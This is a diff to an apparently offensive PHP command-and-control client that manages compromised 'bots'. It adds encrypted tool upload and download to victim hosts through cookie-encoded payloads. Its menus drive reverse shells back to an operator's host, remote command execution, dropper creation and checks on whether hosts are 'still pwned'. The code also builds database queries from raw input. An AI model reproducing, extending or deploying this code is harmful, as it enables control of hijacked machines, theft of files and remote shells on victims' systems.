@@ -104,28 +104,30 @@ function logo($last, $cl, bool $error, $error_value, string $lastHost)
 function menu()
 {
     echo <<< _MENU
-        (O)ptions                                                                   
+        \e[0;32m(O)ptions                                                                   
         (Sys)tem enumeration                                                        
         (Rev)erse shell                                                             
         (Com)mand Execution                                                         
         (CL)oner
-        (CR)eate Dropper                                                                  
-        (U)pdates  -> not implemented yet.                                                                 
-        (A)dd new host                                                              
+        (CR)eate Dropper\e[0m                                                                  
+        \e[0;31;40m(U)pdates  -> not implemented yet.\e[0m                                                                 
+        \e[0;32m(A)dd new host                                                              
         (CH)eck if hosts are still pwned
-        (AT) Add tool
-        (UP)load tool to bot
-        (L)ist (T)ools                                            
+        (AT) Add tool\e[0m
+        \e[0;31;40m(UP)load tool to bot - currently not working, will be soon.\e[0m
+        \e[0;32m(L)ist (T)ools                                            
         (M)ain menu                                                                 
-        (Q)uit                                                                      
+        (Q)uit\e[0m                                                                      
 _MENU;
     echo "\n\n\033[0m\n";
 
 }
 
 
-function b64(array $what, $how, array $whereWeGo)
+function b64(array $what, $how, string $whereWeGo)
 {
+    // this function is currently causing the client to throw a 500 error.
+    // will work though the issue and figure out a fix. but for now, this works... ish.
     curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
     curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
     curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
@@ -133,11 +135,10 @@ function b64(array $what, $how, array $whereWeGo)
     $our_nonce = openssl_random_pseudo_bytes(24);
     $secure_Key = openssl_random_pseudo_bytes(32);
     $additionalData = openssl_random_pseudo_bytes(16);
+    $wheretoGo = pg_fetch_row(pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = %s", $whereWeGo)));
+    curl_setopt(CHH, CURLOPT_URL, $wheretoGo[0].$wheretoGo[1]);
     if ($how === "u") {
-        //UPLOAD IS CURRENTLY UNTESTED. if there are bugs, lemme know.
-
-        curl_setopt(CHH, CURLOPT_URL, $whereWeGo['Rhost'].$whereWeGo['uri']);
-        if ($what['Target'] === $whereWeGo["Os_Flavor"] || $what['Target'] === "universal"){
+        if ($what['Target'] === $wheretoGo[2] || $what['Target'] === "universal"){
             echo "\nTarget and victim OS match, should be good to go\n";
         }elseif ($what['Target'] === "unk"){
             echo "\nTarget of our tool is UNK, I hope you did your research on the target before selecting this.\n";
@@ -152,12 +153,8 @@ function b64(array $what, $how, array $whereWeGo)
         $basedHashUpload = base64_encode($additionalData.".".$our_nonce.".".$secure_Key.".".$needed_values);
         curl_setopt(CHH, CURLOPT_COOKIE, "cb64=U.".hash("sha512", $basedHashUpload, $binary=false)."; jsessionid=". $basedHashUpload);
     }elseif ($how === "D"){
-        awesomeMenu("hosts");
-        $result = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", trim(readline("Which host?(by ID)->"))));
-        $wheretoGo = pg_fetch_row($result);
         $tool = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(base64_encode(serialize($what)), $additionalData, $our_nonce, $secure_Key);
         $baseHashedDownload = base64_encode($additionalData.".".$our_nonce.".".$secure_Key.".".$tool);
-        curl_setopt(CHH, CURLOPT_URL, $wheretoGo[0].$wheretoGo[1]);
         curl_setopt(CHH, CURLOPT_COOKIE, "cb64=D.".hash("sha512", $baseHashedDownload, $binary=false)."; jsessionid=". $baseHashedDownload);
     }
     $dx = curl_exec(CHH);
@@ -656,8 +653,7 @@ function awesomeMenu(string $what)
                 ));
             }
             print(str_repeat("+", 35)."[ -> End <- ]". str_repeat("+", 35)."\n");
-            print(print_r(pg_fetch_row(pg_exec(pg_connect(DBCONN), sprintf("SELECT * FROM %s WHERE id = '%s'", $sloppy_tables[$what], trim(readline("[ ?? ] Please select what you want ->")))))));
-            break;
+            return pg_fetch_row(pg_exec(pg_connect(DBCONN), sprintf("SELECT * FROM %s WHERE id = '%s'", $sloppy_tables[$what], trim(readline("[ ?? ] Please select what you want ->")))));
     }
 
 }
@@ -791,10 +787,10 @@ while ($run) {
     curl_reset(CHH);
     try {
         if (empty(config['sloppy_http']['proxy'])) {
-            echo "\e[0;31;40mPROXY NOT SET.\e[0m\n";
+            echo "\e[0;31;40mPROXY NOT SET.\e[0m".PHP_EOL;
             curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
         } else {
-            echo "\e[0;32;40mProxy Set: " . config['sloppy_http']['proxy']."\e[0m\n";
+            echo "\e[0;32;40mProxy Set: " . config['sloppy_http']['proxy']."\e[0m".PHP_EOL;
             curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
             curl_setopt(CHH, CURLOPT_PROXY, config['sloppy_http']["proxy"]);
         }
@@ -808,8 +804,8 @@ while ($run) {
     } catch (Exception $e) {
         print("{$e}\n\n");
     }
-    echo "Current User-Agent: ". config['sloppy_http']['useragent']."\n";
-    print("\n\033[33;40mPlease select your choice: \n->");
+    echo "Current User-Agent: ". config['sloppy_http']['useragent'].PHP_EOL;
+    print("\n\033[33;40mPlease select your choice:".PHP_EOL."->");
     echo("\033[0m");
     $pw = trim(fgets(STDIN));
     $lc = $pw;
@@ -835,7 +831,15 @@ while ($run) {
             }
             break;
         case "up":
-            b64(array('read' => trim(readline("Which file are we trying to download?(full path please)-> "))), "D", array());
+            $u = readline("[ !! ] Are we uploading or downloading?".PHP_EOL."(u/d)->");
+            if (strtolower($u) === "d") {
+                b64(array('read' => trim(readline("Which file are we trying to download?(full path please)-> "))), "D", array());
+            }else{
+                $x = awesomeMenu("tools");
+                awesomeMenu("hosts");
+                $t = readline("->");
+                b64($x, "u", $t);
+            }
             break;
         case "cr":
             system(clears);
@@ -858,7 +862,7 @@ while ($run) {
         case "sys":
             system(clears);
             awesomeMenu("hosts");
-            $h = readline("Which host are we checking?\n->");
+            $h = readline("Which host are we checking?".PHP_EOL."->");
             try {
                 sys($h);
             } catch (Exception $e) {
@@ -868,10 +872,10 @@ while ($run) {
         case "rev":
             system(clears);
             awesomeMenu("hosts");
-            $h = readline("Please tell me the host.(default is the host sending this request.)\n->");
-            $p = readline("\nWhich port shall we use?(default is 1634)\n->");
-            $m = readline("Which method is to be used?(default is bash)\n->");
-            $w = readline("Who are we connecting back to?\n(our ip/hostname)->");
+            $h = readline("Please tell me the host.(default is the host sending this request.)".PHP_EOL."->");
+            $p = readline(PHP_EOL."Which port shall we use?(default is 1634)".PHP_EOL."->");
+            $m = readline("Which method is to be used?(default is bash)".PHP_EOL."->");
+            $w = readline("Who are we connecting back to?".PHP_EOL."(our ip/hostname)->");
             if (!empty($h)) {
                 rev($h, $p, $m, $w);
             }
@@ -880,9 +884,9 @@ while ($run) {
             system(clears);
             try {
                 awesomeMenu("hosts");
-                $h = readline("Which host are we sending the command to?\n->");
-                $c = readline("And now the command: \n->");
-                $e = readline("Are we needing to encrypt?\n(y/n)->");
+                $h = readline("Which host are we sending the command to?".PHP_EOL."->");
+                $c = readline("And now the command: ".PHP_EOL."->");
+                $e = readline("Are we needing to encrypt?".PHP_EOL."(y/n)->");
                 switch (strtolower($e)) {
                     case "y":
                         $encrypt = true;
@@ -900,8 +904,8 @@ while ($run) {
             system(clears);
             try {
                 awesomeMenu("hosts");
-                $h = readline("Which host are we interacting with?\n->");
-                $rep = readline("Repo to clone?\n->");
+                $h = readline("Which host are we interacting with?".PHP_EOL."->");
+                $rep = readline("Repo to clone?".PHP_EOL."->");
                 clo($h, $rep, queryDB($h, "cl"));
             } catch (Exception $e) {
                 logo("cl", clears, true, $e, $h);
@@ -919,8 +923,8 @@ while ($run) {
         case "a":
             system(clears);
             try {
-                $h = readline("Who did we pwn my friend?\n->");
-                $o = readline("Do you know the OS?\n->");
+                $h = readline("Who did we pwn my friend?".PHP_EOL."->");
+                $o = readline("Do you know the OS?".PHP_EOL."->");
                 aHo($h, $o, 0);
             } catch (Exception $e) {
                 logo("a", clears, true, $e, $h);
@@ -929,20 +933,20 @@ while ($run) {
         case "ch":
             system(clears);
             try {
-                $b = strtolower(readline("Is this going to be a batch job?(Y/N)\n->"));
+                $b = strtolower(readline("Is this going to be a batch job?(Y/N)".PHP_EOL."->"));
                 switch ($b) {
                     case "y":
-                        echo "Executing batch job!\n";
+                        echo "Executing batch job!".PHP_EOL;
                         check('0', 'b', "y");
                         break;
                     case "n":
-                        echo "Not executing batch job.\n";
+                        echo "Not executing batch job.".PHP_EOL;
                         awesomeMenu("hosts");
-                        $h = readline("Who is it we need to check on?(based on ID)\n->");
+                        $h = readline("Who is it we need to check on?(based on ID)".PHP_EOL."->");
                         check($h, "chR", "n");
                         break;
                     default:
-                        logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.\n", '');
+                        logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.".PHP_EOL, '');
                         break;
                 }
             } catch (Exception $e) {
@@ -962,7 +966,7 @@ while ($run) {
             break;
         default:
             logo($lc, clears, "", "", '');
-            echo "\033[33;40myou need to select a valid option...\033[0m\n";
+            echo "\033[33;40myou need to select a valid option...\033[0m".PHP_EOL;
     }
 }
 
